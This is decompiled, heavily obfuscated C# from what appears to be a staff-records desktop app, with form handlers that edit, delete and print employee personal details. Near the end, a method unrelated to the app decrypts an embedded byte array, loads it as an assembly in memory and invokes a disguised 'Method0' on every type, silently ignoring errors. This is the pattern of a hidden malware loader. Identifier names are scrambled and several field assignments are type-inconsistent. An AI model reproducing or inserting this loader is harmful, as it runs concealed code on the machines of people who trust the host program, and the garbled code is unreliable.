        Label ⴐ = this.Ⴐ;
        int num = (obj as Af03).Ⴗ;
        string str1 = num.ToString();
        ⴐ.Text = str1;
        this.ႣႳ.Text = ((Af03) obj).Ⴐ;
        this.ႭႠ.Text = (obj as Af03).Ⴃ;
        this.ႭႥ.Text = ((Af03) obj).Ⴗ;
        this.ႣႠ.Value = DateTime.Parse((obj as Af03).Ⴈ);
        this.ႭႳ.Text = ((Af03) obj).Ⴍ;
        this.ႣႤ.Text = ((Af03) obj).Ⴓ;
        this.ႣႭ.Text = (obj as Af03).Ⴄ;
        Label ⴃ2 = this.Ⴃ;
        num = ((Af03) obj).Ⴃ;
        string str2 = num.ToString();
        ⴃ2.Text = str2;
        this.ႤႨ.Text = (obj as Af03).Ⴃ.ToString();
        this.ႤႭ.Text = (obj as Af03).Ⴈ.ToShortDateString();
        this.ႤႰ.Text = (obj as Af03).Ⴀ;
        IEnumerable<char> ⴀⴐ = (IEnumerable<char>) (obj as Af03).ႠႰ;
        if (Operators.CompareString(ⴀⴐ as string, "IT Dept.", false) != 0)
        {
          if (Operators.CompareString((string) ⴀⴐ, "HR Dept.", false) != 0)
          {
            if (Operators.CompareString(ⴀⴐ as string, "Accounting Dept.", false) != 0)
            {
              if (Operators.CompareString((string) ⴀⴐ, "Marketing Dept.", false) == 0)
                this.Ⴅ.SelectedIndex = 3;
            }
            else
              this.Ⴅ.SelectedIndex = 2;
          }
          else
            this.Ⴅ.SelectedIndex = 1;
        }
        else
          this.Ⴅ.SelectedIndex = 0;
        IComparable ⴅ = (IComparable) ((Af03) obj).Ⴅ;
        if (Operators.CompareString((string) ⴅ, "Male", false) != 0)
        {
          if (Operators.CompareString((string) ⴅ, "Female", false) == 0)
            this.Ⴓ.Checked = true;
        }
        else
          this.ႣႨ.Checked = true;
        switch (((Af03) obj).Ⴀ)
        {
          case 0:
            this.Ⴍ.SelectedIndex = 5;
            break;
          case 1:
            this.Ⴍ.SelectedIndex = 4;
            break;
          case 2:
            this.Ⴍ.SelectedIndex = 3;
            break;
          case 3:
            this.Ⴍ.SelectedIndex = 2;
            break;
          case 4:
            this.Ⴍ.SelectedIndex = 1;
            break;
          case 5:
            this.Ⴍ.SelectedIndex = 0;
            break;
        }
      }
    }

    private void w3DY([In] object obj0, [In] EventArgs obj1)
    {
      object obj2 = (object) new Tt1();
      Table<Af03> ⴃ = ((Tt1) obj2).Ⴃ;
      object obj3 = (object) Expression.Parameter(typeof (Af03), "o");
      // ISSUE: method reference
      // ISSUE: method reference
      // ISSUE: field reference
      Expression<Func<Af03, bool>> predicate = Expression.Lambda<Func<Af03, bool>>((Expression) Expression.Equal((Expression) Expression.Call((Expression) null, (MethodInfo) MethodBase.GetMethodFromHandle(__methodref (Operators.CompareString)), new Expression[3]
      {
        (Expression) Expression.Property((Expression) obj3, (MethodInfo) MethodBase.GetMethodFromHandle(__methodref (Af03.i0KG))),
        (Expression) Expression.Field((Expression) Expression.Constant((object) this, typeof (o3GX)), FieldInfo.GetFieldFromHandle(__fieldref (o3GX.ႠႨ))),
        (Expression) Expression.Constant((object) false, typeof (bool))
      }), (Expression) Expression.Constant((object) 0, typeof (int)), false, (MethodInfo) null), (ParameterExpression) obj3);
      INotifyPropertyChanged entity1 = (INotifyPropertyChanged) ⴃ.FirstOrDefault<Af03>(predicate);
      object obj4 = (object) new StringBuilder();
      IComponent component = (IComponent) null;
      IEnumerable<char> chars = (IEnumerable<char>) "";
      chars = (IEnumerable<char>) this.ႣႳ.Text;
      object text1 = (object) this.ႭႠ.Text;
      object Left1 = this.ႭႥ.MaskCompleted ? (object) this.ႭႥ.Text : (object) "";
      ICloneable Left2 = this.ႤႨ.MaskCompleted ? (ICloneable) this.ႤႨ.Text : (ICloneable) "";
      IConvertible Left3 = (IConvertible) this.ႣႠ.Value.ToString("yyyy-MM-dd");
      IEnumerable enumerable;
      if (this.Ⴓ.Checked)
        enumerable = (IEnumerable) "Female";
      else if (this.ႣႨ.Checked)
      {
        enumerable = (IEnumerable) "Male";
      }
      else
      {
        int num = (int) MessageBox.Show("Please select gender !", "error");
        return;
      }
      object Left4 = this.ႭႳ.MaskCompleted ? (object) this.ႭႳ.Text : (object) "";
      IEquatable<string> text2 = (IEquatable<string>) this.ႣႤ.Text;
      IConvertible text3 = (IConvertible) this.ႣႭ.Text;
      IComparable comparable = Operators.CompareString(this.Ⴅ.SelectedItem.ToString(), "HR Dept.", false) != 0 ? (IComparable) "Staff" : (IComparable) "Staff";
      if (Operators.CompareString(Left3 as string, "", false) == 0)
      {
        (obj4 as StringBuilder).AppendLine("- Please Enter Correct Birthday");
        if (!(component is Control control))
          control = (Control) this.ႣႠ;
        component = (IComponent) control;
      }
      if (Operators.CompareString((string) text1, "", false) == 0)
      {
        (obj4 as StringBuilder).AppendLine("- Please Enter Name");
        component = (IComponent) ((Control) component ?? (Control) this.ႭႠ);
      }
      if (this.Ⴅ.SelectedIndex < 0)
      {
        ((StringBuilder) obj4).AppendLine("- Please Select Department");
        component = (IComponent) ((Control) component ?? (Control) this.Ⴅ);
      }
      if (Operators.CompareString((string) Left1, "", false) == 0)
      {
        (obj4 as StringBuilder).AppendLine("- Please Enter Correct IC Format");
        component = (IComponent) ((Control) component ?? (Control) this.ႭႥ);
      }
      if (Operators.CompareString((string) Left4, "", false) == 0)
      {
        (obj4 as StringBuilder).AppendLine("- Please Enter Correct Phone Format");
        if (!(component is Control control))
          control = (Control) this.ႭႳ;
        component = (IComponent) control;
      }
      if (Operators.CompareString((string) Left2, "", false) == 0)
      {
        (obj4 as StringBuilder).AppendLine("- Please Enter Correct Hourly Pay");
        component = (IComponent) ((Control) component ?? (Control) this.ႤႨ);
      }
      if (Operators.CompareString((string) text2, "", false) == 0)
      {
        ((StringBuilder) obj4).AppendLine("- Please Enter Email");
        if (!(component is Control control))
          control = (Control) this.ႣႤ;
        component = (IComponent) control;
      }
      if (Operators.CompareString(text3 as string, "", false) == 0)
      {
        (obj4 as StringBuilder).AppendLine("- Please Enter Address");
        component = (IComponent) ((Control) component ?? (Control) this.ႣႭ);
      }
      if ((obj4 as StringBuilder).Length > 0)
      {
        int num = (int) MessageBox.Show(((StringBuilder) obj4).ToString(), "Input Error", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
        ((Control) component).Focus();
      }
      else if ((Af03) entity1 == null)
      {
        int num = (int) MessageBox.Show("Staff not found", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
        this.Close();
      }
      else
      {
        (obj2 as Tt1).Ⴃ.DeleteOnSubmit((Af03) entity1);
        (obj2 as Tt1).SubmitChanges();
        try
        {
          object entity2 = (object) new Af03();
          ((Af03) entity2).Ⴐ = this.ႣႳ.Text;
          ((Af03) entity2).Ⴗ = int.Parse(this.Ⴐ.Text);
          ((Af03) entity2).Ⴀ = this.ႤႰ.Text;
          (entity2 as Af03).Ⴃ = this.ႭႠ.Text;
          ((Af03) entity2).Ⴗ = this.ႭႥ.Text;
          (entity2 as Af03).Ⴈ = this.ႣႠ.Value.ToString("yyyy-MM-dd");
          (entity2 as Af03).Ⴅ = enumerable as string;
          ((Af03) entity2).Ⴍ = this.ႭႳ.Text;
          ((Af03) entity2).Ⴓ = this.ႣႤ.Text;
          ((Af03) entity2).Ⴄ = this.ႣႭ.Text;
          ((Af03) entity2).Ⴜ = comparable as string;
          (entity2 as Af03).ႠႰ = this.Ⴅ.SelectedItem.ToString();
          (entity2 as Af03).Ⴀ = int.Parse(this.Ⴍ.SelectedItem.ToString());
          (entity2 as Af03).Ⴃ = int.Parse(this.Ⴃ.Text);
          ((Af03) entity2).Ⴃ = new Decimal(int.Parse(this.ႤႨ.Text));
          ((Af03) entity2).Ⴈ = DateTime.Parse(this.ႤႭ.Text);
          (obj2 as Tt1).Ⴃ.InsertOnSubmit(entity2 as Af03);
          try
          {
            (obj2 as Tt1).SubmitChanges();
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            int num = (int) MessageBox.Show("Error : " + ((object) ex as Exception).Message, "error");
            ProjectData.ClearProjectError();
          }
          int num1 = (int) MessageBox.Show("Staff [" + this.ႣႳ.Text + "] updated", "Done", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          int num = (int) MessageBox.Show("Error : " + ex.Message, "error");
          ProjectData.ClearProjectError();
        }
      }
    }

    private void Qy1g([In] object obj0, [In] EventArgs obj1)
    {
      DataContext dataContext = (DataContext) new Tt1();
      Table<Af03> ⴃ = ((Tt1) dataContext).Ⴃ;
      object obj = (object) Expression.Parameter(typeof (Af03), "o");
      // ISSUE: method reference
      // ISSUE: method reference
      // ISSUE: field reference
      Expression<Func<Af03, bool>> predicate = Expression.Lambda<Func<Af03, bool>>((Expression) Expression.Equal((Expression) Expression.Call((Expression) null, (MethodInfo) MethodBase.GetMethodFromHandle(__methodref (Operators.CompareString)), new Expression[3]
      {
        (Expression) Expression.Property((Expression) obj, (MethodInfo) MethodBase.GetMethodFromHandle(__methodref (Af03.i0KG))),
        (Expression) Expression.Field((Expression) Expression.Constant((object) this, typeof (o3GX)), FieldInfo.GetFieldFromHandle(__fieldref (o3GX.ႠႨ))),
        (Expression) Expression.Constant((object) false, typeof (bool))
      }), (Expression) Expression.Constant((object) 0, typeof (int)), false, (MethodInfo) null), (ParameterExpression) obj);
      INotifyPropertyChanged entity = (INotifyPropertyChanged) ⴃ.FirstOrDefault<Af03>(predicate);
      if (!(entity is Af03))
      {
        int num = (int) MessageBox.Show("Staff not found", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
        this.Close();
      }
      else
      {
        ((Tt1) dataContext).Ⴃ.DeleteOnSubmit((Af03) entity);
        (dataContext as Tt1).SubmitChanges();
        int num = (int) MessageBox.Show("Staff [" + ((Af03) entity).Ⴐ + "] deleted", "Done", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
        this.Close();
      }
    }

    private void z2HF([In] object obj0, [In] EventArgs obj1) => this.Close();

    private void f3F6([In] object obj0, [In] PrintPageEventArgs obj1)
    {
      DataContext dataContext = (DataContext) new Tt1();
      object obj = (object) new Font("Calibri", 24f, FontStyle.Bold);
      IDisposable disposable = (IDisposable) new Font("Calibri", 14f, FontStyle.Bold);
      ISerializable serializable1 = (ISerializable) new Font("Consolas", 14f, FontStyle.Bold);
      IEquatable<string> s1 = (IEquatable<string>) "\r\nStaff Personal Details";
      object s2 = (object) string.Format("\r\n\r\n\r\nPrinted on {0:dd-MMMM-yyyy hh:mm:ss tt}\r\nPrepared by \r\nStaff ID : " + Ec63.Ⴅ + "    Staff Name : " + Ec63.Ⴀ + "\r\nFrom HR Department.", (object) DateTime.Now);
      ISerializable serializable2 = (ISerializable) new StringBuilder();
      IEnumerable<char> chars;
      if (this.Ⴓ.Checked)
        chars = (IEnumerable<char>) "Female";
      else if (this.ႣႨ.Checked)
      {
        chars = (IEnumerable<char>) "Male";
      }
      else
      {
        int num = (int) MessageBox.Show("Please select gender !", "error");
        return;
      }
      ((StringBuilder) serializable2).AppendLine("\r\n");
      (serializable2 as StringBuilder).AppendLine("\r\n");
      ((StringBuilder) serializable2).AppendLine("----------------------------------------------------------------------------------------------------------------------------------");
      (serializable2 as StringBuilder).AppendLine("\r\n         Staff ID          : " + this.ႣႳ.Text);
      (serializable2 as StringBuilder).AppendLine("\r\n         Staff Name        : " + this.ႭႠ.Text);
      ((StringBuilder) serializable2).AppendLine("\r\n         Department        : " + this.Ⴅ.SelectedItem.ToString());
      ((StringBuilder) serializable2).AppendLine("\r\n         Joined Date       : " + this.ႤႭ.Text);
      ((StringBuilder) serializable2).AppendLine("\r\n         IC Number         : " + this.ႭႥ.Text);
      ((StringBuilder) serializable2).AppendLine("\r\n         Birthday          : " + this.ႣႠ.Value.ToString("yyyy-MM-dd"));
      (serializable2 as StringBuilder).AppendLine("\r\n         Gender            : " + (string) chars);
      (serializable2 as StringBuilder).AppendLine("\r\n         Phone Number      : " + this.ႭႳ.Text);
      (serializable2 as StringBuilder).AppendLine("\r\n         Email             : " + this.ႣႤ.Text);
      ((StringBuilder) serializable2).AppendLine("\r\n         Address           : " + this.ႣႭ.Text);
      (serializable2 as StringBuilder).AppendLine("\r\n----------------------------------------------------------------------------------------------------------------------------------");
      ((StringBuilder) serializable2).AppendLine();
      object graphics = (object) obj1.Graphics;
      (graphics as Graphics).DrawString((string) s1, obj as Font, Brushes.Purple, 100f, 0.0f);
      (graphics as Graphics).DrawString(s2 as string, (Font) disposable, Brushes.Black, 100f, 40f);
      ((Graphics) graphics).DrawString((serializable2 as StringBuilder).ToString(), serializable1 as Font, Brushes.Black, 0.0f, 120f);
    }

    private void Mc48([In] object obj0, [In] EventArgs obj1)
    {
      this.ႤႣ.Document = this.ႤႷ;
      int num = (int) this.ႤႣ.ShowDialog((IWin32Window) this);
    }

    internal static void r1LX([In] List<object> obj0, [In] byte[] obj1, [In] int obj2)
    {
      Array rawAssembly = (Array) new byte[checked (Conversions.ToInteger(Operators.SubtractObject(NewLateBinding.LateGet(obj0[3], (System.Type) null, "length", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (object) 1)) + 1)];
      object Counter;
      object LoopForResult;
      object CounterResult;
      if (ObjectFlowControl.ForLoopControl.ForLoopInitObj(Counter, (object) 0, Operators.SubtractObject(NewLateBinding.LateGet(obj0[3], (System.Type) null, "length", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (object) 1), (object) 1, ref LoopForResult, ref CounterResult))
      {
        do
        {
          int num1 = Conversions.ToInteger(Operators.AddObject(CounterResult, (object) y9LX.o1BE(obj2, obj1.Length))) & obj2;
          int index = y9LX.o1BE(Conversions.ToInteger(CounterResult), obj1.Length);
          int num2 = b8BW.d2XT(Convert.ToInt32(obj1[index]), num1);
          int num3 = b8BW.d2XT(Conversions.ToInteger(NewLateBinding.LateIndexGet(obj0[3], new object[1]
          {
            CounterResult
          }, (string[]) null)), num2);
          (rawAssembly as byte[])[Conversions.ToInteger(CounterResult)] = checked ((byte) num3);
        }
        while (ObjectFlowControl.ForLoopControl.ForNextCheckObj(CounterResult, LoopForResult, ref CounterResult));
      }
      obj0.Add((object) "klhjfpo[jhffsdartulupopohgtrsrtytyui[]zxcvjhu7ygop");
      obj0.Add((object) "System.Reflection.Assembly");
      obj0.Add((object) "Load");
      obj0.Add((object) AppDomain.CurrentDomain.Load((byte[]) rawAssembly));
      obj0.Add((object) ((Assembly) obj0[8]).GetTypes());
      object enumerator;
      try
      {
        enumerator = (object) ((IEnumerable) obj0[9]).GetEnumerator();
        while (((IEnumerator) enumerator).MoveNext())
        {
          object objectValue = RuntimeHelpers.GetObjectValue(((IEnumerator) enumerator).Current);
          try
          {
            NewLateBinding.LateCall(objectValue, (System.Type) null, "InvokeMember", new object[5]
            {
              (object) ("Me" + "th" + "o" + "d0"),
              (object) BindingFlags.InvokeMethod,
              null,
              null,
              (object) new object[0]
            }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
      }
      finally
      {
        if ((IEnumerator) enumerator is IDisposable)
          ((IEnumerator) enumerator as IDisposable).Dispose();
      }
    }

    internal sealed class Dj7b
    {
      internal IContainer Ⴓ;
      internal Label Ⴐ;
      internal Label Ⴄ;
      internal Label Ⴍ;
      internal Label Ⴀ;
      internal ComboBox Ⴅ;
      internal Label Ⴈ;
      internal Button Ⴃ;
      internal TextBox Ⴗ;
      internal TextBox Ⴜ;
      internal GroupBox ႰႳ;
      internal DateTimePicker ႰႰ;
      internal Label ႰႤ;
      internal Label ႰႭ;
      internal Label ႰႠ;
      internal Label ႰႥ;
      internal MaskedTextBox ႰႨ;
      internal Button ႰႣ;
      internal PrintPreviewDialog ႰႷ;
      internal MaskedTextBox ႰႼ;

      internal Dj7b()
      {
      }
    }

    internal sealed class We0c
    {
      internal Label Ⴃ;
      internal Label Ⴀ;
      internal Label Ⴈ;
      internal Label Ⴓ;
      internal Button Ⴐ;
      internal Button Ⴄ;
      internal ErrorProvider Ⴗ;

      internal We0c()
      {
      }
    }
  }
}
